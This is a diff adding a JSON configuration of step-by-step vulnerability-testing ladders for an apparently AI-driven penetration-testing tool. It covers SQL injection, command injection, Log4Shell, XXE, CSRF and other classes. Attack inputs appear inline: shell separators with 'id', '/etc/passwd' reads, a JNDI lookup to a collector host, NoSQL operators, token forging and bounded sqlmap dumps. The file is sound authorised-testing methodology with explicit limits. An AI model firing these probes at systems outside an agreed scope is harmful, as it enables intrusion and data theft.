@@ -1,0 +1,587 @@
+{
+  "version": 1,
+  "note": "One ladder per vulnerability class. Cheapest discriminating probe first, proof last. `proves` marks the step whose evidence can satisfy the class's proof requirement. A step is a suggestion to the model, not a script: the controller offers the next unrun step, the model may justify a different one, and the ledger records which ran. `skill` names a depth skill when one exists and is null when the class has a ladder but no written-down method yet; skills/INDEX.md lists those explicitly.",
+  "classes": {
+    "sqli": {
+      "skill": "web-sqli",
+      "steps": [
+        {
+          "step": "quote-differential",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "one quote in the parameter changes status, length or error text"
+        },
+        {
+          "step": "boolean-pair",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "AND 1=1 and AND 1=2 differ, which a WAF echo cannot fake"
+        },
+        {
+          "step": "control-request",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "a value that certainly exists, to show the differential is not noise"
+        },
+        {
+          "step": "sqlmap-confirm",
+          "tool": "exploit.sqlmap",
+          "tier": "active",
+          "args": {
+            "level": 1,
+            "risk": 1
+          },
+          "why": "name the technique and the DBMS"
+        },
+        {
+          "step": "minimal-extraction",
+          "tool": "exploit.sqlmap",
+          "tier": "active",
+          "args": {
+            "dump": true,
+            "limit": 5
+          },
+          "proves": "data_extraction",
+          "why": "one named table, up to five rows: a proof, not a dump"
+        }
+      ]
+    },
+    "rce": {
+      "skill": "web-command-injection",
+      "steps": [
+        {
+          "step": "separator-sweep",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "; | && $() `` newline: which separator reaches a shell"
+        },
+        {
+          "step": "timing-control",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "sleep 5 against sleep 0, twice each, to exclude a slow endpoint"
+        },
+        {
+          "step": "marker-command",
+          "tool": "proof.exec_marker",
+          "tier": "intrusive",
+          "proves": "command_output",
+          "why": "id; echo <nonce> — the nonce is the proof and the command changes nothing"
+        }
+      ]
+    },
+    "ssti": {
+      "skill": "web-ssti",
+      "steps": [
+        {
+          "step": "delimiter-sweep",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "{{ }} ${ } <%= %> #{ }: which delimiter the engine owns"
+        },
+        {
+          "step": "nonce-arithmetic",
+          "tool": "proof.template_eval",
+          "tier": "active",
+          "proves": "template_eval",
+          "why": "a product of two nonce-derived numbers, so the result cannot appear by chance"
+        },
+        {
+          "step": "engine-identify",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "error text or object introspection names the engine before any escape is tried"
+        }
+      ]
+    },
+    "lfi": {
+      "skill": "web-file-read",
+      "steps": [
+        {
+          "step": "traversal-depth",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "../ at several depths, with and without encoding"
+        },
+        {
+          "step": "negative-control",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "a path that cannot exist, to learn what 'not found' looks like"
+        },
+        {
+          "step": "known-file-read",
+          "tool": "proof.file_read",
+          "tier": "active",
+          "proves": "file_read",
+          "why": "/etc/passwd or win.ini: a file whose shape is known"
+        }
+      ]
+    },
+    "ssrf": {
+      "skill": "web-ssrf",
+      "steps": [
+        {
+          "step": "scheme-sweep",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "http file gopher dict: which schemes the fetcher accepts"
+        },
+        {
+          "step": "collector-callback",
+          "tool": "proof.oob_start",
+          "tier": "active",
+          "proves": "oob",
+          "why": "a nonce host we control; the callback is the proof"
+        },
+        {
+          "step": "internal-only-response",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "a response only the internal network could have produced, when no collector is reachable"
+        }
+      ]
+    },
+    "idor": {
+      "skill": "web-authz",
+      "steps": [
+        {
+          "step": "identity-probe",
+          "tool": "session.probe_as",
+          "tier": "active",
+          "why": "read the object as the identity that owns it, so the shape of an authorised answer is on record before anything is crossed"
+        },
+        {
+          "step": "cross-read",
+          "tool": "session.compare_as",
+          "tier": "active",
+          "proves": "differential",
+          "why": "the same request as A, as B and as unauthenticated, with A's own object as the entitlement control, graded against the idor requirement in one call. A cross-read without its control is the commonest way an automated tester invents broken access control, so the tool takes the controls itself rather than trusting a later call to"
+        }
+      ]
+    },
+    "auth-bypass": {
+      "skill": "web-auth-session",
+      "steps": [
+        {
+          "step": "identity-probe",
+          "tool": "session.probe_as",
+          "tier": "active",
+          "why": "the privileged request as identity=unauthenticated, before any token is touched. That identity always exists and needs no credential, so this rung is always runnable, and if it already returns the privileged content there is no bypass to prove - the endpoint requires nothing, which is a simpler and larger finding. A token to forge comes from session.login or session.add, which store it instead of leaving it in the model context"
+        },
+        {
+          "step": "token-dissect",
+          "tool": "http.probe",
+          "tier": "passive",
+          "why": "algorithm, claims, signature, expiry: read before anything is changed"
+        },
+        {
+          "step": "forge-attempt",
+          "tool": "proof.token_probe",
+          "tier": "active",
+          "why": "alg=none, key confusion, kid traversal, claim swap"
+        },
+        {
+          "step": "invalid-control",
+          "tool": "proof.token_probe",
+          "tier": "active",
+          "proves": "token_forgery",
+          "why": "a deliberately broken token must be rejected and a no-token request must fail, or the endpoint simply needs no authentication - proof.token_probe takes both controls itself"
+        }
+      ]
+    },
+    "xss": {
+      "skill": "web-xss",
+      "steps": [
+        {
+          "step": "context-map",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "where the value lands: html body, attribute, script literal, url"
+        },
+        {
+          "step": "breakout-probe",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "the characters that leave that one context, not a payload list"
+        },
+        {
+          "step": "browser-execution",
+          "tool": "proof.browser_exec",
+          "tier": "active",
+          "proves": "browser_execution",
+          "why": "a headless browser reports the nonce; reflection alone is not execution"
+        }
+      ]
+    },
+    "xxe": {
+      "skill": "web-xxe",
+      "steps": [
+        {
+          "step": "parser-probe",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "does the endpoint parse XML at all, and does it resolve a harmless internal entity"
+        },
+        {
+          "step": "local-file-entity",
+          "tool": "proof.file_read",
+          "tier": "active",
+          "proves": "file_read",
+          "why": "a known local file through the entity"
+        },
+        {
+          "step": "oob-entity",
+          "tool": "proof.oob_start",
+          "tier": "active",
+          "proves": "oob",
+          "why": "for the blind case, a parameter entity to our collector"
+        }
+      ]
+    },
+    "deserialization": {
+      "skill": "web-deserialization",
+      "steps": [
+        {
+          "step": "format-identify",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "magic bytes, prefix, or a library name in an error"
+        },
+        {
+          "step": "benign-gadget",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "a payload whose only effect is a distinguishable parse error"
+        },
+        {
+          "step": "marker-command",
+          "tool": "proof.exec_marker",
+          "tier": "intrusive",
+          "proves": "command_output",
+          "why": "the same nonce rule as rce"
+        }
+      ]
+    },
+    "secret-exposure": {
+      "skill": "web-secret-exposure",
+      "steps": [
+        {
+          "step": "bundle-mine",
+          "tool": "recon.js_mine",
+          "tier": "active",
+          "why": "endpoints and keys in shipped javascript"
+        },
+        {
+          "step": "path-sweep",
+          "tool": "fuzz.content",
+          "tier": "active",
+          "why": ".git .env backup swap files"
+        },
+        {
+          "step": "issuer-validation",
+          "tool": "ledger.add_evidence",
+          "tier": "active",
+          "proves": "secret_leak",
+          "why": "validate against the issuing service only, never a third party, and record the result as evidence with extracted.validated=true; no tool here will call an external issuer on your behalf"
+        }
+      ]
+    },
+    "version-cve": {
+      "skill": "cve-triage",
+      "steps": [
+        {
+          "step": "version-pin",
+          "tool": "recon.fingerprint",
+          "tier": "active",
+          "why": "an exact version, from a banner or an asset hash, not a guess"
+        },
+        {
+          "step": "advisory-read",
+          "tool": "knowledge.cve_lookup",
+          "tier": "passive",
+          "why": "the advisory's preconditions, which usually exclude this instance"
+        },
+        {
+          "step": "precondition-check",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "the specific configuration the CVE needs"
+        },
+        {
+          "step": "class-proof",
+          "tool": "proof.exec_marker",
+          "tier": "intrusive",
+          "why": "prove it under the class the CVE implies; a version match is never a finding"
+        }
+      ]
+    },
+    "race-condition": {
+      "skill": "web-race-condition",
+      "steps": [
+        {
+          "step": "window-read",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "read the check before racing it: a response that reports the remaining count tells you the window exists and the precondition is still set up"
+        },
+        {
+          "step": "stability-check",
+          "tool": "http.differential",
+          "tier": "active",
+          "args": {
+            "repeat": 3
+          },
+          "why": "a page that differs from itself cannot support a race claim — the tool says so, and the one anomalous response would sit inside that noise"
+        },
+        {
+          "step": "reset-path",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "find the request that puts the resource back. Without it the serial control and the burst cannot both start from the same state, the difference would be an artifact of the order, and web.race_probe refuses a state-changing burst that has no reset_url"
+        },
+        {
+          "step": "parallel-vs-serial",
+          "tool": "web.race_probe",
+          "tier": "intrusive",
+          "args": {
+            "count": 10,
+            "changes_state": true
+          },
+          "proves": "differential",
+          "why": "N requests at once against the same N one after another, with the serial control taken inside the same call and both orderings preceded by the reset. An outcome the serial ordering never reached is the whole class; the tier is intrusive because the burst is the state change, and a read-only burst takes changes_state=false and stays active"
+        }
+      ]
+    },
+    "cache-poisoning": {
+      "skill": null,
+      "steps": [
+        {
+          "step": "cache-presence",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "age, x-cache, cf-cache-status and vary say whether there is a shared cache in front of this URL at all. Unkeyed-input testing against an origin with no cache cannot produce this class, and this step is what stops the budget going there"
+        },
+        {
+          "step": "unkeyed-input",
+          "tool": "web.cache_probe",
+          "tier": "intrusive",
+          "proves": "differential",
+          "why": "a nonce in a candidate unkeyed header, then the same URL fetched clean: the clean response carrying what someone else's header put there is the proof, not the poisoning request. The probe takes its own pre-poisoning control on a separate cache entry, and poisons only a cache-buster entry unless told otherwise"
+        }
+      ]
+    },
+    "open-redirect": {
+      "skill": null,
+      "steps": [
+        {
+          "step": "destination-parameter",
+          "tool": "recon.params",
+          "tier": "active",
+          "why": "next, url, returnTo, redirect_uri, continue, dest: the parameter that carries a destination is the only entry point this class has"
+        },
+        {
+          "step": "destination-shapes",
+          "tool": "web.redirect_probe",
+          "tier": "active",
+          "proves": "differential",
+          "why": "absolute, scheme-relative, backslash, @-userinfo, whitespace and encoded destinations in one pass, with the in-origin and no-destination controls. The Location header is the measurement and nothing follows it: following a redirect is a request to a host the scope gate never checked"
+        }
+      ]
+    },
+    "file-upload-rce": {
+      "skill": null,
+      "steps": [
+        {
+          "step": "upload-shape",
+          "tool": "recon.js_mine",
+          "tier": "active",
+          "why": "the client bundle names the upload endpoint, the form field and often the directory uploads are served from; guessing the request shape wastes the intrusive budget on 400s"
+        },
+        {
+          "step": "upload-inert-marker",
+          "tool": "web.upload_probe",
+          "tier": "intrusive",
+          "why": "one inert text file named with a nonce: is this extension accepted, and where is the stored file served from. The tool has no argument for the file's content, so it cannot be asked to upload code"
+        },
+        {
+          "step": "served-path-sweep",
+          "tool": "fuzz.content",
+          "tier": "active",
+          "why": "when the upload response does not name the stored path, find the directory it is served from. Without a served path there is nothing an interpreter could run and the class is not reachable"
+        },
+        {
+          "step": "marker-command",
+          "tool": "proof.exec_marker",
+          "tier": "intrusive",
+          "proves": "command_output",
+          "why": "id; echo <nonce> against the served path, when that path takes a parameter that reaches a shell. When it does not, reaching execution needs a file that runs a command, which is a decision a human makes and belongs in scripts/exploits/ with its own cleanup - an accepted extension is a precondition and not this proof"
+        },
+        {
+          "step": "upload-cleanup",
+          "tool": "web.upload_probe",
+          "tier": "intrusive",
+          "args": {
+            "mode": "cleanup"
+          },
+          "why": "remove the uploaded file and record the removal. A file left on a target is an artifact the client did not agree to, and the record is what lets the report say it is gone"
+        }
+      ]
+    },
+    "graphql-exposure": {
+      "skill": null,
+      "steps": [
+        {
+          "step": "graphql-inventory",
+          "tool": "web.graphql_probe",
+          "tier": "active",
+          "why": "introspection, then field suggestion for when introspection is off, then a batched array: the type and field inventory, and whether N operations ride in one request past a per-request rate limit"
+        },
+        {
+          "step": "bounded-document-read",
+          "tool": "web.graphql_probe",
+          "tier": "active",
+          "args": {
+            "mode": "query"
+          },
+          "proves": "data_extraction",
+          "why": "one document asking a named collection for an id this caller is not entitled to, with at most five documents kept. An introspection dump proves the schema is readable and nothing else; the requirement is the documents"
+        }
+      ]
+    },
+    "nosqli": {
+      "skill": null,
+      "steps": [
+        {
+          "step": "operator-differential",
+          "tool": "http.differential",
+          "tier": "active",
+          "why": "id=1 against id[$ne]=1, with the self-similarity check: a parameter that accepts a query operator returns a different result set, and a WAF page cannot fake a changed result set"
+        },
+        {
+          "step": "operator-in-json",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "{\"password\": {\"$ne\": null}} in the JSON body: whether the operator reaches the query or is compared as a string. A JSON body and a query string are different parsers and only one of them is usually guarded"
+        },
+        {
+          "step": "regex-oracle",
+          "tool": "http.differential",
+          "tier": "active",
+          "why": "{\"$regex\": \"^a\"} against {\"$regex\": \"^zzz\"}: a document store with no error messages still answers differently, which is the discriminating step when the operator is accepted silently"
+        },
+        {
+          "step": "bounded-document-read",
+          "tool": "ledger.add_evidence",
+          "tier": "active",
+          "proves": "data_extraction",
+          "why": "no tool in this broker extracts from a document store - sqlmap is a SQL tool and its NoSQL coverage is not something to build a ladder step on - so the read is made with http.probe and recorded by hand with the field names the verifier reads: extracted.table for the collection, extracted.rows for at most five documents, extracted.row_count. The graded requirement is identical to a SQL extraction minus the engine fingerprint, which a document store often does not report"
+        }
+      ]
+    },
+    "log4shell": {
+      "skill": null,
+      "steps": [
+        {
+          "step": "collector-start",
+          "tool": "proof.oob_start",
+          "tier": "passive",
+          "why": "the collector binds on this machine and mints the token; the target must have a route back, which is true in a lab or on an internal engagement and false for most internet targets. Knowing that before sending payloads is what stops a blocked egress being read as a closed class"
+        },
+        {
+          "step": "jndi-in-logged-fields",
+          "tool": "http.probe",
+          "tier": "active",
+          "why": "${jndi:ldap://<collector>/<token>} in User-Agent, X-Forwarded-For, Referer, X-Api-Version and any field the application is likely to log. The token is what ties a callback to this probe rather than to someone else's scan"
+        },
+        {
+          "step": "callback-check",
+          "tool": "proof.oob_check",
+          "tier": "passive",
+          "proves": "oob",
+          "why": "a lookup arriving at our collector with this probe's token is the proof. No callback is not a negative result: it may mean egress is blocked, which is a separate measurement and belongs in the report as a boundary"
+        }
+      ]
+    },
+    "csrf": {
+      "skill": null,
+      "steps": [
+        {
+          "step": "cors-origin-matrix",
+          "tool": "web.cors_probe",
+          "tier": "active",
+          "why": "whether another origin may send a credentialed request at all. A rejected Origin and a SameSite cookie close this class before any payload is written, and this is the cheapest way to find that out"
+        },
+        {
+          "step": "token-absence",
+          "tool": "http.differential",
+          "tier": "active",
+          "why": "the same state-changing request with and without the anti-CSRF token: if both are accepted the token is decorative. A 403 here is the falsifier"
+        },
+        {
+          "step": "state-change-phases",
+          "tool": "ledger.add_evidence",
+          "tier": "active",
+          "proves": "state_change",
+          "why": "read, act cross-origin, read again: three records with phase=before, phase=action and phase=after, and an actor on the action record that is not the owner. No tool in this broker drives a browser through a cross-origin form post, so the action is performed with playwright or the playwright MCP server and the three records are written by hand; the matrix grades them on the same terms as anything else"
+        }
+      ]
+    },
+    "prototype-pollution": {
+      "skill": null,
+      "steps": [
+        {
+          "step": "merge-sink",
+          "tool": "recon.js_mine",
+          "tier": "active",
+          "why": "the bundle names the merge, extend, clone or query-parser helper and the input that reaches it. Pollution without a known sink is a payload list with nowhere to land"
+        },
+        {
+          "step": "pollution-differential",
+          "tool": "http.differential",
+          "tier": "active",
+          "why": "__proto__[x]=<nonce> and constructor.prototype[x]=<nonce> against the clean request: a polluted property that changes a server response is the server-side half of the class, and it is cheap"
+        },
+        {
+          "step": "browser-execution",
+          "tool": "proof.browser_exec",
+          "tier": "active",
+          "proves": "browser_execution",
+          "why": "the class is proven by a browser reporting that the polluted property changed behaviour. A reflected __proto__ parameter is not pollution, and a polluted property with no observable consequence is not a finding"
+        }
+      ]
+    }
+  },
+  "recon_ladder": [
+    {
+      "step": "host-liveness",
+      "tool": "recon.ports",
+      "tier": "active",
+      "why": "what answers at all"
+    },
+    {
+      "step": "service-fingerprint",
+      "tool": "recon.fingerprint",
+      "tier": "active",
+      "why": "server, framework, versions"
+    },
+    {
+      "step": "content-discovery",
+      "tool": "fuzz.content",
+      "tier": "active",
+      "why": "paths the front page does not link"
+    },
+    {
+      "step": "parameter-discovery",
+      "tool": "recon.params",
+      "tier": "active",
+      "why": "every input, the only place a class can live"
+    },
+    {
+      "step": "template-scan",
+      "tool": "scan.nuclei",
+      "tier": "active",
+      "why": "known-issue candidates, which are candidates only"
+    }
+  ]
+}
